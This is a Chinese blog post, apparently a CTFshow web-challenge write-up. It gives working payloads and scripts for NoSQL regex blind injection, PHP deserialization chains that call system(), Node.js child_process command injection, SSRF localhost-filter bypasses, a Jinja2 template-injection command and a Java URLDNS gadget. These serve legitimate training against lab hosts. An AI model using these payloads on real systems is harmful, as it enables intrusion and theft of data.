SQL注入篇 - b477eRy - 博客园\n猜测到id为flag，直接布尔盲注拿到flag\nimport string import requests url = \u0026#34;http://5ce4ea0d-afb5-4f1c-9e65-626bdaa6e433.challenge.ctf.show:8080/api/\u0026#34; letters = \u0026#34;{}-_\u0026#34; + string.ascii_lowercase + string.digits def valid_pass(password: str) -\u0026gt; bool: data = { \u0026#34;username[$regex]\u0026#34;: \u0026#34;flag\u0026#34;, \u0026#34;password[$regex]\u0026#34;: f\u0026#34;{password}.*\u0026#34; } response = requests.post(url, data=data) return \u0026#34;登陆成功\u0026#34; in response.json()[\u0026#34;msg\u0026#34;] result = \u0026#34;\u0026#34; while True: for letter in letters: if valid_pass(result + letter): result += letter print(f\u0026#34;[*] result: {result}\u0026#34;) break 方法二 import requests, time, json def brute(action, username=\u0026#34;\u0026#34;): url = \u0026#34;http://44e163eb-3f69-4641-83b2-5499d9c0d5ed.challenge.ctf.show/api/\u0026#34; if action == \u0026#34;username\u0026#34;: res = \u0026#34;^[^a]\u0026#34; # admin1的password为ctfshow666...很明显不是flag，所以禁掉admin开头的用户 else: res = \u0026#34;^ctfshow{\u0026#34; for j in range(30): flag = False for i in range(127): reg = res if chr(i) not in \u0026#34;0123456789abcdefghijklmnopqrstuvwxyz-{}:,_\u0026#34;: continue n = chr(i) if chr(i) in \u0026#34;-{}:\u0026#34;: n = \u0026#34;\\\\\u0026#34;+chr(i) print(chr(i)) if action == \u0026#34;username\u0026#34;: data = {\u0026#34;username[$regex]\u0026#34;: f\u0026#34;{reg+n}\u0026#34;, \u0026#34;password[$ne]\u0026#34;: f\u0026#34;1\u0026#34;} else: data = {\u0026#34;username[$regex]\u0026#34;: f\u0026#34;{username}$\u0026#34;, \u0026#34;password[$regex]\u0026#34;: f\u0026#34;{reg+n}\u0026#34;} while True: try: r = requests.post(url, data=data, timeout=7) break except TimeoutError: time.sleep(0.1) except KeyboardInterrupt: exit(0) try: resp = json.loads(r.text) except: resp = None continue if resp[\u0026#34;msg\u0026#34;] == \u0026#34;\\u767b\\u9646\\u6210\\u529f\u0026#34;: res += chr(i) flag = True break if not flag: break print(res) return res if __name__ == \u0026#39;__main__\u0026#39;: username = brute(\u0026#34;username\u0026#34;) print(f\u0026#34;用户名为: {username}\u0026#34;) password = brute(\u0026#34;password\u0026#34;, username) print(f\u0026#34;用户名: {username}\\n密码: {password}\u0026#34;) 反序列化 PHP的魔法方法 PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。 常见的魔法方法如下：\n1__construct()，类的构造函数 2 3__destruct()，类的析构函数 4 5__call()，在对象中调用一个不可访问方法时调用 6 7__callStatic()，用静态方式中调用一个不可访问方法时调用 8 9__get()，获得一个类的成员变量时调用 10 11__set()，设置一个类的成员变量时调用 12 13__isset()，当对不可访问属性调用isset()或empty()时调用 14 15__unset()，当对不可访问属性调用unset()时被调用。 16 17__sleep()，执行serialize()时，先会调用这个函数 18 19__wakeup()，执行unserialize()时，先会调用这个函数 20 21__toString()，类被当成字符串时的回应方法 22 23__invoke()，调用函数的方式调用一个对象时的回应方法 24 25__set_state()，调用var_export()导出类时，此静态方法会被调用。 26 27__clone()，当对象复制完成时调用 28 29__autoload()，尝试加载未定义的类 30 31__debugInfo()，打印所需调试信息 web254 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-12-02 17:44:47 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-12-02 19:29:02 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15highlight_file(__FILE__); 16include(\u0026#39;flag.php\u0026#39;); 17 18class ctfShowUser{ 19 public $username=\u0026#39;xxxxxx\u0026#39;; 20 public $password=\u0026#39;xxxxxx\u0026#39;; 21 public $isVip=false; 22 23 public function checkVip(){ 24 return $this-\u0026gt;isVip; 25 } 26 public function login($u,$p){ 27 if($this-\u0026gt;username===$u\u0026amp;\u0026amp;$this-\u0026gt;password===$p){ 28 $this-\u0026gt;isVip=true; 29 } 30 return $this-\u0026gt;isVip; 31 } 32 public function vipOneKeyGetFlag(){ 33 if($this-\u0026gt;isVip){ 34 global $flag; 35 echo \u0026#34;your flag is \u0026#34;.$flag; 36 }else{ 37 echo \u0026#34;no vip, no flag\u0026#34;; 38 } 39 } 40} 41 42$username=$_GET[\u0026#39;username\u0026#39;]; 43$password=$_GET[\u0026#39;password\u0026#39;]; 44 45if(isset($username) \u0026amp;\u0026amp; isset($password)){ 46 $user = new ctfShowUser(); 47 if($user-\u0026gt;login($username,$password)){ 48 if($user-\u0026gt;checkVip()){ 49 $user-\u0026gt;vipOneKeyGetFlag(); 50 } 51 }else{ 52 echo \u0026#34;no vip,no flag\u0026#34;; 53 } 54} 看着很长，实际上审一下代码发现账号和密码已经放出来了\npublic $username=\u0026#39;xxxxxx\u0026#39;; public $password=\u0026#39;xxxxxx\u0026#39;; poc\n/?username=xxxxxx\u0026amp;password=xxxxxx web255 相比上一题只是把\n$user = new ctfShowUser(); 改为了\n$user = unserialize($_COOKIE[\u0026#39;user\u0026#39;]); 区别不大只需要通过反序列化的方式实例化ctfShowUser()即可\n1$user = new ctfShowUser(); 2$user-\u0026gt;isVip=true; //不能漏 3echo urlencode(serialize($user)); 传参拿到flag\nweb256 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-12-02 17:44:47 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-12-02 19:29:02 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15highlight_file(__FILE__); 16include(\u0026#39;flag.php\u0026#39;); 17 18class ctfShowUser{ 19 public $username=\u0026#39;xxxxxx\u0026#39;; 20 public $password=\u0026#39;xxxxxx\u0026#39;; 21 public $isVip=false; 22 23 public function checkVip(){ 24 return $this-\u0026gt;isVip; 25 } 26 public function login($u,$p){ 27 return $this-\u0026gt;username===$u\u0026amp;\u0026amp;$this-\u0026gt;password===$p; 28 } 29 public function vipOneKeyGetFlag(){ 30 if($this-\u0026gt;isVip){ 31 global $flag; 32 if($this-\u0026gt;username!==$this-\u0026gt;password){ 33 echo \u0026#34;your flag is \u0026#34;.$flag; 34 } 35 }else{ 36 echo \u0026#34;no vip, no flag\u0026#34;; 37 } 38 } 39} 40 41$username=$_GET[\u0026#39;username\u0026#39;]; 42$password=$_GET[\u0026#39;password\u0026#39;]; 43 44if(isset($username) \u0026amp;\u0026amp; isset($password)){ 45 $user = unserialize($_COOKIE[\u0026#39;user\u0026#39;]); 46 if($user-\u0026gt;login($username,$password)){ 47 if($user-\u0026gt;checkVip()){ 48 $user-\u0026gt;vipOneKeyGetFlag(); 49 } 50 }else{ 51 echo \u0026#34;no vip,no flag\u0026#34;; 52 } 53} 相比上一道题多了个\n$this-\u0026gt;username!==$this-\u0026gt;password 区别不大\npoc\n1$user = new ctfShowUser(); 2$user-\u0026gt;isVip=true; 3$user-\u0026gt;username=\u0026#34;okok\u0026#34;; 4echo urlencode(serialize($user)); 传参拿到flag\nweb257 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-12-02 17:44:47 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-12-02 20:33:07 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15highlight_file(__FILE__); 16 17class ctfShowUser{ 18 private $username=\u0026#39;xxxxxx\u0026#39;; 19 private $password=\u0026#39;xxxxxx\u0026#39;; 20 private $isVip=false; 21 private $class = \u0026#39;info\u0026#39;; 22 23 public function __construct(){ 24 $this-\u0026gt;class=new info(); 25 } 26 public function login($u,$p){ 27 return $this-\u0026gt;username===$u\u0026amp;\u0026amp;$this-\u0026gt;password===$p; 28 } 29 public function __destruct(){ 30 $this-\u0026gt;class-\u0026gt;getInfo(); 31 } 32 33} 34 35class info{ 36 private $user=\u0026#39;xxxxxx\u0026#39;; 37 public function getInfo(){ 38 return $this-\u0026gt;user; 39 } 40} 41 42class backDoor{ 43 private $code; 44 public function getInfo(){ 45 eval($this-\u0026gt;code); 46 } 47} 48 49$username=$_GET[\u0026#39;username\u0026#39;]; 50$password=$_GET[\u0026#39;password\u0026#39;]; 51 52if(isset($username) \u0026amp;\u0026amp; isset($password)){ 53 $user = unserialize($_COOKIE[\u0026#39;user\u0026#39;]); 54 $user-\u0026gt;login($username,$password); 55} 这道题存在一个后门方法\n我们想办法走到后面方法这一步，并通过eval执行命令即可得到flag\npoc\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-12-02 17:44:47 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-12-02 20:33:07 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15class ctfShowUser{ 16 private $username=\u0026#39;xxxxxx\u0026#39;; 17 private $password=\u0026#39;xxxxxx\u0026#39;; 18 private $isVip=false; 19 private $class = \u0026#39;backDoor\u0026#39;; 20 21 public function __construct(){ 22 $this-\u0026gt;class=new backDoor(); 23 } 24 public function login($u,$p){ 25 return $this-\u0026gt;username===$u\u0026amp;\u0026amp;$this-\u0026gt;password===$p; 26 } 27 public function __destruct(){ 28 $this-\u0026gt;class-\u0026gt;getInfo(); 29 } 30 31} 32 33class info{ 34 private $user=\u0026#39;xxxxxx\u0026#39;; 35 public function getInfo(){ 36 return $this-\u0026gt;user; 37 } 38} 39 40class backDoor{ 41 private $code =\u0026#39;system(\u0026#34;cat fl*\u0026#34;);\u0026#39;; 42 public function getInfo(){ 43 eval($this-\u0026gt;code); 44 } 45} 46 47 48$user = new ctfShowUser(); 49echo urlencode(serialize($user)); web258 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-12-02 17:44:47 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-12-02 21:38:56 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15highlight_file(__FILE__); 16 17class ctfShowUser{ 18 public $username=\u0026#39;xxxxxx\u0026#39;; 19 public $password=\u0026#39;xxxxxx\u0026#39;; 20 public $isVip=false; 21 public $class = \u0026#39;info\u0026#39;; 22 23 public function __construct(){ 24 $this-\u0026gt;class=new info(); 25 } 26 public function login($u,$p){ 27 return $this-\u0026gt;username===$u\u0026amp;\u0026amp;$this-\u0026gt;password===$p; 28 } 29 public function __destruct(){ 30 $this-\u0026gt;class-\u0026gt;getInfo(); 31 } 32 33} 34 35class info{ 36 public $user=\u0026#39;xxxxxx\u0026#39;; 37 public function getInfo(){ 38 return $this-\u0026gt;user; 39 } 40} 41 42class backDoor{ 43 public $code; 44 public function getInfo(){ 45 eval($this-\u0026gt;code); 46 } 47} 48 49$username=$_GET[\u0026#39;username\u0026#39;]; 50$password=$_GET[\u0026#39;password\u0026#39;]; 51 52if(isset($username) \u0026amp;\u0026amp; isset($password)){ 53 if(!preg_match(\u0026#39;/[oc]:\\d+:/i\u0026#39;, $_COOKIE[\u0026#39;user\u0026#39;])){ 54 $user = unserialize($_COOKIE[\u0026#39;user\u0026#39;]); 55 } 56 $user-\u0026gt;login($username,$password); 57} 这道题相对于上一道题需要正则表达式进行绕过\npoc\n1\u0026lt;?php 2class ctfShowUser{ 3 public $username=\u0026#39;xxxxxx\u0026#39;; 4 public $password=\u0026#39;xxxxxx\u0026#39;; 5 public $isVip=false; 6 public $class = \u0026#39;info\u0026#39;; 7 8 public function __construct(){ 9 $this-\u0026gt;class=new backDoor(); 10 } 11 public function login($u,$p){ 12 return $this-\u0026gt;username===$u\u0026amp;\u0026amp;$this-\u0026gt;password===$p; 13 } 14 public function __destruct(){ 15 $this-\u0026gt;class-\u0026gt;getInfo(); 16 } 17 18} 19 20class backDoor{ 21 public $code=\u0026#39;system(\u0026#34;tac ./flag.php\u0026#34;);\u0026#39;; 22 public function getInfo(){ 23 eval($this-\u0026gt;code); 24 } 25} 26$a = serialize(new ctfShowUser()); 27$a = str_replace(\u0026#39;O:\u0026#39;,\u0026#39;O:+\u0026#39;,$a); 28echo urlencode($a); 我们可以通过+绕过\nweb289 flag.php\n1$xff = explode(\u0026#39;,\u0026#39;, $_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;]); 2array_pop($xff); 3$ip = array_pop($xff); 4 5 6if($ip!==\u0026#39;127.0.0.1\u0026#39;){ 7\tdie(\u0026#39;error\u0026#39;); 8}else{ 9\t$token = $_POST[\u0026#39;token\u0026#39;]; 10\tif($token==\u0026#39;ctfshow\u0026#39;){ 11\tfile_put_contents(\u0026#39;flag.txt\u0026#39;,$flag); 12\t} 13} 1\u0026lt;?php 2 3highlight_file(__FILE__); 4 5 6$vip = unserialize($_GET[\u0026#39;vip\u0026#39;]); 7//vip can get flag one key 8$vip-\u0026gt;getFlag(); 根据题目提示存在flag.php页面且只允许\nnode.js web334 login.js\n1var express = require(\u0026#39;express\u0026#39;); 2var router = express.Router(); 3var users = require(\u0026#39;../modules/user\u0026#39;).items; 4 5var findUser = function(name, password){ 6 return users.find(function(item){ 7 return name!==\u0026#39;CTFSHOW\u0026#39; \u0026amp;\u0026amp; item.username === name.toUpperCase() \u0026amp;\u0026amp; item.password === password; 8 }); 9}; 10 11/* GET home page. */ 12router.post(\u0026#39;/\u0026#39;, function(req, res, next) { 13 res.type(\u0026#39;html\u0026#39;); 14 var flag=\u0026#39;flag_here\u0026#39;; 15 var sess = req.session; 16 var user = findUser(req.body.username, req.body.password); 17 18 if(user){ 19 req.session.regenerate(function(err) { 20 if(err){ 21 return res.json({ret_code: 2, ret_msg: \u0026#39;登录失败\u0026#39;}); 22 } 23 24 req.session.loginUser = user.username; 25 res.json({ret_code: 0, ret_msg: \u0026#39;登录成功\u0026#39;,ret_flag:flag}); 26 }); 27 }else{ 28 res.json({ret_code: 1, ret_msg: \u0026#39;账号或密码错误\u0026#39;}); 29 } 30 31}); 32 33module.exports = router; user.js\n1module.exports = { 2 items: [ 3 {username: \u0026#39;CTFSHOW\u0026#39;, password: \u0026#39;123456\u0026#39;} 4 ] 5}; 审计一下代码看到已经给出了明文的账号密码\n但是要注意这里\nreturn name!==\u0026#39;CTFSHOW\u0026#39; \u0026amp;\u0026amp; item.username === name.toUpperCase() \u0026amp;\u0026amp; item.password === password; 这里要去输入的账号不能为CTFSHOW，且输入的用户名转换为大写后与明文账号相同即可\n那就很简单了，输入小写的ctfshow和密码123456即可得到flag\nweb335 查看源代码得到hint\n看到eval猜测是命令执行，js中的eval函数的利用与php中的有所不同\nNode.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。\npayload:\n/?eval=require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;ls\u0026#39;).toString() /?eval=require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;cat fl00g.txt\u0026#39;).toString() require(\u0026#39;child_process\u0026#39;).spawnSync(\u0026#39;ls\u0026#39;,[\u0026#39;./\u0026#39;]).stdout.toString() require(\u0026#39;child_process\u0026#39;).spawnSync(\u0026#39;cat\u0026#39;,[\u0026#39;fl00g.txt\u0026#39;]).stdout.toString() global.process.mainModule.constructor._load(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;ls\u0026#39;,[\u0026#39;.\u0026#39;]).toString() 那为什么下面的方法会回显[object object]呢？\nrequire(\u0026#39;child_process\u0026#39;).exec(\u0026#39;calc\u0026#39;); //这题不知道为什么exec用不了 当你在 Web 界面通过某种命令注入手段调用 Node.js的 child_process 时，如果希望直接在页面上看到命令输出结果，execsync 会更直观。它会阻塞直到命令执行结束，并将结果返回给你的代码，你能直接以字符串形式处理和展示。而 exec则需要通过回调来拿结果，如果没写回调或没正确处理，就只会看到一个[object object]的返回。\nweb336 这题跟上一题差不多，但是貌似把execSync办了\n用其他方法即可\nrequire(\u0026#39;child_process\u0026#39;).spawnSync(\u0026#39;ls\u0026#39;,[\u0026#39;./\u0026#39;]).stdout.toString() require(\u0026#39;child_process\u0026#39;).spawnSync(\u0026#39;cat\u0026#39;,[\u0026#39;fl00g.txt\u0026#39;]).stdout.toString() global.process.mainModule.constructor._load(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;ls\u0026#39;,[\u0026#39;.\u0026#39;]).toString() web337 1var express = require(\u0026#39;express\u0026#39;); 2var router = express.Router(); 3var crypto = require(\u0026#39;crypto\u0026#39;); 4 5function md5(s) { 6 return crypto.createHash(\u0026#39;md5\u0026#39;) 7 .update(s) 8 .digest(\u0026#39;hex\u0026#39;); 9} 10 11/* GET home page. */ 12router.get(\u0026#39;/\u0026#39;, function(req, res, next) { 13 res.type(\u0026#39;html\u0026#39;); 14 var flag=\u0026#39;xxxxxxx\u0026#39;; 15 var a = req.query.a; 16 var b = req.query.b; 17 if(a \u0026amp;\u0026amp; b \u0026amp;\u0026amp; a.length===b.length \u0026amp;\u0026amp; a!==b \u0026amp;\u0026amp; md5(a+flag)===md5(b+flag)){ 18 res.end(flag); 19 }else{ 20 res.render(\u0026#39;index\u0026#39;,{ msg: \u0026#39;tql\u0026#39;}); 21 } 22 23}); 24 25module.exports = router; SSRF web351 1\u0026lt;?php 2error_reporting(0); 3highlight_file(__FILE__); 4$url=$_POST[\u0026#39;url\u0026#39;]; 5$ch=curl_init($url); 6curl_setopt($ch, CURLOPT_HEADER, 0); 7curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 8$result=curl_exec($ch); 9curl_close($ch); 10echo ($result); 11?\u0026gt; 没有过滤，直接读文件\nPayload:\nurl=127.0.0.1/flag.php url=localhost/flag.php web352 1\u0026lt;?php 2error_reporting(0); 3highlight_file(__FILE__); 4$url=$_POST[\u0026#39;url\u0026#39;]; 5$x=parse_url($url); 6if($x[\u0026#39;scheme\u0026#39;]===\u0026#39;http\u0026#39;||$x[\u0026#39;scheme\u0026#39;]===\u0026#39;https\u0026#39;){ 7if(!preg_match(\u0026#39;/localhost|127.0.0/\u0026#39;)){ 8$ch=curl_init($url); 9curl_setopt($ch, CURLOPT_HEADER, 0); 10curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 11$result=curl_exec($ch); 12curl_close($ch); 13echo ($result); 14} 15else{ 16 die(\u0026#39;hacker\u0026#39;); 17} 18} 19else{ 20 die(\u0026#39;hacker\u0026#39;); 21} 22?\u0026gt; 这道题限制了只能使用http和https协议\n同时也添加了过滤\nif(!preg_match(\u0026#39;/localhost|127.0.0/\u0026#39;)) 缺省法\npayload：\nurl=http://127.1/flag.php url=http://0/flag.php //windows中解析为0.0.0.0 //linux解析为127.0.0.1 or\n使用十进制绕过\npayload：\nurl=http://2130706433/flag.php web353 1\u0026lt;?php 2error_reporting(0); 3highlight_file(__FILE__); 4$url=$_POST[\u0026#39;url\u0026#39;]; 5$x=parse_url($url); 6if($x[\u0026#39;scheme\u0026#39;]===\u0026#39;http\u0026#39;||$x[\u0026#39;scheme\u0026#39;]===\u0026#39;https\u0026#39;){ 7if(!preg_match(\u0026#39;/localhost|127\\.0\\.|\\。/i\u0026#39;, $url)){ 8$ch=curl_init($url); 9curl_setopt($ch, CURLOPT_HEADER, 0); 10curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 11$result=curl_exec($ch); 12curl_close($ch); 13echo ($result); 14} 15else{ 16 die(\u0026#39;hacker\u0026#39;); 17} 18} 19else{ 20 die(\u0026#39;hacker\u0026#39;); 21} 22?\u0026gt; 过滤\n!preg_match(\u0026#39;/localhost|127\\.0\\.|\\。/i\u0026#39;, $url) 这题依旧可以用上题方法解决\n其他payload：\n// 127.0.0.1 ~ 127.255.255.254 都表示 localhost url=http://127.255.255.254/flag.php 127开头都会被解析为localhost\nweb354 1\u0026lt;?php 2error_reporting(0); 3highlight_file(__FILE__); 4$url=$_POST[\u0026#39;url\u0026#39;]; 5$x=parse_url($url); 6if($x[\u0026#39;scheme\u0026#39;]===\u0026#39;http\u0026#39;||$x[\u0026#39;scheme\u0026#39;]===\u0026#39;https\u0026#39;){ 7if(!preg_match(\u0026#39;/localhost|1|0|。/i\u0026#39;, $url)){ 8$ch=curl_init($url); 9curl_setopt($ch, CURLOPT_HEADER, 0); 10curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 11$result=curl_exec($ch); 12curl_close($ch); 13echo ($result); 14} 15else{ 16 die(\u0026#39;hacker\u0026#39;); 17} 18} 19else{ 20 die(\u0026#39;hacker\u0026#39;); 21} 22?\u0026gt; 这道题的1和0都被过滤了，我们可以用dns重定向的方法来绕过\n网络上存在一个域名sudo.cc会重定向到127.0.0.1\npayload:\nurl=http://sudo.cc/flag.php 其他方法\n可以用自己的域名进行dns重定向\n或者通过 http://ceye.io/\nweb355 1\u0026lt;?php 2error_reporting(0); 3highlight_file(__FILE__); 4$url=$_POST[\u0026#39;url\u0026#39;]; 5$x=parse_url($url); 6if($x[\u0026#39;scheme\u0026#39;]===\u0026#39;http\u0026#39;||$x[\u0026#39;scheme\u0026#39;]===\u0026#39;https\u0026#39;){ 7$host=$x[\u0026#39;host\u0026#39;]; 8if((strlen($host)\u0026lt;=5)){ 9$ch=curl_init($url); 10curl_setopt($ch, CURLOPT_HEADER, 0); 11curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 12$result=curl_exec($ch); 13curl_close($ch); 14echo ($result); 15} 16else{ 17 die(\u0026#39;hacker\u0026#39;); 18} 19} 20else{ 21 die(\u0026#39;hacker\u0026#39;); 22} 23?\u0026gt; 这道题对host的长度进行了限制，但是由于没有进行过滤我们可以用0来代替127.0.0.1\npayload：\nurl=http://0/flag.php or\nurl=http://127.1/flag.php web356 1\u0026lt;?php 2error_reporting(0); 3highlight_file(__FILE__); 4$url=$_POST[\u0026#39;url\u0026#39;]; 5$x=parse_url($url); 6if($x[\u0026#39;scheme\u0026#39;]===\u0026#39;http\u0026#39;||$x[\u0026#39;scheme\u0026#39;]===\u0026#39;https\u0026#39;){ 7$host=$x[\u0026#39;host\u0026#39;]; 8if((strlen($host)\u0026lt;=3)){ 9$ch=curl_init($url); 10curl_setopt($ch, CURLOPT_HEADER, 0); 11curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 12$result=curl_exec($ch); 13curl_close($ch); 14echo ($result); 15} 16else{ 17 die(\u0026#39;hacker\u0026#39;); 18} 19} 20else{ 21 die(\u0026#39;hacker\u0026#39;); 22} 23?\u0026gt; payload:\nurl=http://0/flag.php web357 1\u0026lt;?php 2error_reporting(0); 3highlight_file(__FILE__); 4$url=$_POST[\u0026#39;url\u0026#39;]; 5$x=parse_url($url); 6if($x[\u0026#39;scheme\u0026#39;]===\u0026#39;http\u0026#39;||$x[\u0026#39;scheme\u0026#39;]===\u0026#39;https\u0026#39;){ 7$ip = gethostbyname($x[\u0026#39;host\u0026#39;]); 8echo \u0026#39;\u0026lt;/br\u0026gt;\u0026#39;.$ip.\u0026#39;\u0026lt;/br\u0026gt;\u0026#39;; 9if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) { 10 die(\u0026#39;ip!\u0026#39;); 11} 12 13 14echo file_get_contents($_POST[\u0026#39;url\u0026#39;]); 15} 16else{ 17 die(\u0026#39;scheme\u0026#39;); 18} 19?\u0026gt; ssti 通过遍历找模块\n1from flask import Flask, request 2from jinja2 import Template 3 4 5app = Flask(__name__) 6 7@app.route(\u0026#34;/\u0026#34;) 8def index(): 9 search = \u0026#39;os\u0026#39; #你想利用的模块 10 num = -1 11 for i in ().__class__.__base__.__subclasses__(): 12 num += 1 13 try: 14 if search in i.__init__.__globals__.keys(): 15 print(i, num) 16 except: 17 # print(\u0026#34;no\u0026#34;) 18 pass 19 20 21if __name__ == \u0026#34;__main__\u0026#34;: 22 app.run() web361 没有waf，直接打\n{{g.pop.__globals__.__builtins__[\u0026#39;__import__\u0026#39;](\u0026#39;os\u0026#39;).popen(\u0026#39;cat /flag\u0026#39;).read()}} web362 Java反序列化： web846 URLDNS\npayload：\n1import java.io. *; 2import java.lang.reflect.Field; 3import java.util.*; 4import java.net.URL; 5import java.util.HashMap; 6 7 8public class URLDNS { 9 public static void serialize(Object obj) throws IOException{ 10 ByteArrayOutputStream data =new ByteArrayOutputStream(); 11 ObjectOutput oos =new ObjectOutputStream(data); 12 oos.writeObject(obj); 13 oos.flush(); 14 oos.close(); 15 System.out.println(Base64.getEncoder().encodeToString(data.toByteArray())); 16 }; 17 public static void main(String[] args) throws Exception{ 18 HashMap\u0026lt;URL,Integer\u0026gt; hashmap = new HashMap\u0026lt;URL,Integer\u0026gt;(); 19 URL url = new URL(\u0026#34;https://78c78067-c876-40fb-b175-edb3b743655d.challenge.ctf.show/\u0026#34;); 20 Class c = url.getClass(); 21 Field hashcodefield = c.getDeclaredField(\u0026#34;hashCode\u0026#34;); 22 hashcodefield.setAccessible(true); 23// 不想这里发起请求，把url对象的hashcode改成不是-1 24 hashcodefield.set(url,911); 25 hashmap.put(url,1); 26 hashcodefield.set(url,-1); 27// 这里把hashcode改回-1 28 29 serialize(hashmap); 30 } 31} ","permalink":"http://localhost:1313/post/ctfshow_web/","summary":"\u003ch1 id=\"ctfshow_web\"\u003eCTFshow_Web\u003c/h1\u003e\n\u003ch3 id=\"信息收集完工\"\u003e\u003cstrong\u003e信息收集\u003c/strong\u003e：（完工）\u003c/h3\u003e\n\u003ch4 id=\"web-1-5\"\u003eWeb 1-5\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e查看网页源代码\u003c/li\u003e\n\u003cli\u003e抓个包看有没有藏东西\u003c/li\u003e\n\u003cli\u003e查看robots.txt\u003c/li\u003e\n\u003cli\u003ephps源码泄露，访问index.phps，通过其源码泄露，在其中找到flag\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"web6\"\u003eWeb6\u003c/h4\u003e\n\u003cp\u003e网页提示下载源码查看，访问url/www.zip得到源码文件\u003c/p\u003e","title":"Ctfshow sql篇"},{"content":"","permalink":"http://localhost:1313/about/","summary":"about","title":"关于"}]